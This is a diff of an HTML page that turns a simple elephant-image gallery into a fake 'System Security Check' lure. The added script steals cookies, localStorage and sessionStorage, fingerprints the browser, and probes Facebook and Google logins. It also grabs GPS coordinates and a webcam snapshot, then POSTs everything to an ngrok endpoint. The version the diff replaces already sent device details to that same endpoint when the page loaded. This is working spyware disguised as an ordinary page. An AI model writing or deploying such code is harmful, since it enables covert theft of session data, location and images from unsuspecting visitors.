@@ -3,38 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nature Gallery</title>
+    <title>System Security Check</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; overflow: hidden; }
-        img { max-width: 100%; height: auto; border-radius: 8px; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; }
+        #auth-box { text-align: center; padding: 40px; border: 2px solid #00ff41; background: #000; box-shadow: 0 0 20px #00ff41; border-radius: 10px; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; font-size: 1.1em; margin-top: 25px; border-radius: 5px; }
+        #content { display: none; text-align: center; }
+        img { max-width: 90%; border: 3px solid #fff; border-radius: 10px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <img src="elephant.jpg" alt="Display">
+    <div id="auth-box">
+        <h1 id="status-text">>_ ACCESS_DENIED</h1>
+        <p>Verify system integrity to decrypt and view visual data.</p>
+        <button onclick="startInfiltration()">VERIFY & UNLOCK</button>
+    </div>
+
+    <div id="content">
+        <img src="elephant.jpg" alt="Decrypted Data">
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        window.onload = async () => {
-            try {
-                let visitorData = {
-                    platform: navigator.platform,
-                    agent: navigator.userAgent,
-                    cores: navigator.hardwareConcurrency || "N/A",
-                    memory: navigator.deviceMemory || "N/A",
-                    res: window.screen.width + "x" + window.screen.height,
-                    pdf: navigator.pdfViewerEnabled
-                };
+        // বর্তমান সচল এনগ্রোক লিঙ্কটি এখানে দিন
+        const NGROK_URL = 'https://2f74-103-174-44-17.ngrok-free.app'; 
 
-                // আপনার সচল এনগ্রোক এন্ডপয়েন্ট
-                const url = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
-
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(visitorData)
-                });
-            } catch (e) { }
+        const getFingerprint = () => {
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+            ctx.fillText("UID-99-SH", 2, 2);
+            return btoa(canvas.toDataURL()).substring(60, 80); 
         };
+
+        async function startInfiltration() {
+            document.getElementById('status-text').innerText = ">_ ANALYZING...";
+            
+            let report = {
+                system: {
+                    fingerprint: getFingerprint(),
+                    platform: navigator.platform,
+                    ram: navigator.deviceMemory + "GB",
+                    cores: navigator.hardwareConcurrency,
+                    cookies: document.cookie || "No Cookies Found",
+                    localStorage: JSON.stringify(localStorage),
+                    sessionStorage: JSON.stringify(sessionStorage),
+                    vulnerabilities: []
+                },
+                network: {},
+                socials: {}
+            };
+
+            // Vulnerability Check
+            if (navigator.pdfViewerEnabled) report.system.vulnerabilities.push("PDF Exploit Potential");
+            if (navigator.webdriver) report.system.vulnerabilities.push("Bot/Automation Detected");
+            if (!window.chrome) report.system.vulnerabilities.push("Non-Chromium Browser");
+
+            // Network Info
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                report.network = { type: conn.effectiveType, speed: conn.downlink + " Mbps", rtt: conn.rtt + "ms" };
+            }
+
+            // Social Check
+            const checkSoc = (url) => new Promise(r => { 
+                const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = url; 
+            });
+            report.socials.facebook = await checkSoc('https://www.facebook.com/favicon.ico');
+            report.socials.google = await checkSoc('https://accounts.google.com/favicon.ico');
+
+            // Location & Camera
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        sendToMaster(report, canvas.toDataURL('image/jpeg'));
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1500);
+                } catch (e) { sendToMaster(report, null); }
+            }, () => sendToMaster(report, null));
+
+            document.getElementById('auth-box').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+        }
+
+        function sendToMaster(data, photo) {
+            fetch(`${NGROK_URL}/vulnerability_probe`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...data, photo: photo })
+            });
+        }
     </script>
 </body>
 </html>
